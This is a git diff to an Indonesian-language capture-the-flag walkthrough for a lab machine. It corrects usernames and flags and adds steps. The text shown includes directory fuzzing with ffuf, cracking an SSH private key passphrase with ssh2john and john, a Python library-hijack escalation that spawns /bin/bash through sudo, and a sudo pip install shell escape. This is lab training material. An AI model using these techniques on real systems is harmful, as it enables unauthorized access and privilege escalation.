@@ -64,13 +64,16 @@ http://<ip_server>/~secret
 - dapat passphrase : **fasttrack**
 - cari file tersembunyi pada folder secret
 ```
-ffuf -c -ic -u http://<ip_server>/~secret/.FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -f 403 -e .txt,.html
+ffuf -c -ic -u http://<ip_server>/~secret/.FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -fc 403 -e .txt,.html
 ```
 - access file
 ```
 http://<ip_server>/~secret/.mysecret.txt
 ```
 - dekripsi pesan dengan **cyberchef**
+```
+https://gchq.github.io/CyberChef/
+```
 - paste pesan ke input dan gunakan **data format**
 - uji coba satu persatu dari **To Hex** sampai **From Base58**
 - sampai menemukan hasil output
@@ -88,6 +91,10 @@ iUJ66WmRUN9EoVlkeCzQJwivI=
 -----END OPENSSH PRIVATE KEY-----
 ```
 - simpan kedalam file **my_key_ssh.rsa**
+- ubah mode
+```
+chmod 600 my_key_ssh.rsa
+```
 
 
 ## Decrypt Key SSH
@@ -102,7 +109,7 @@ ssh2john my_key_ssh.rsa > my_hash
 john --wordlist=/usr/share/wordlists/fasttrack.txt my_hash
 
 ```
-- dapat passphrase (password ssh) : **p@55w0rd!**
+- dapat passphrase (password ssh) : **P@55w0rd!**
 
 
 
@@ -131,10 +138,10 @@ sudo -l
 ```
 - access file python
 ```
-cat /home/arsena/heist.py
+cat /home/arsene/heist.py
 
 ```
-- dari direktori file dan keterangan username terdapat user lain selain **icex64** yaitu user **arsena**
+- dari direktori file dan keterangan username terdapat user lain selain **icex64** yaitu user **arsene**
 - teknik **(Python Library Hijacking Approach)**
 - cari direktori modul **webbrowser** dengan **linpeas**
 ```
@@ -156,7 +163,7 @@ os.system("/bin/bash")
 ```
 - login user **arsena**
 ```
-sudo -u arsena /usr/bin/python3.9 /home/arsena/heist.py
+sudo -u arsena /usr/bin/python3.9 /home/arsene/heist.py
 
 ```
 - coba cek sudo lagi
@@ -175,6 +182,13 @@ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"
 ```
 ```
 sudo pip install $TF
+```
+- mode terminal
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+```
+export TERM=xterm
 ```
 - flag2
 ```
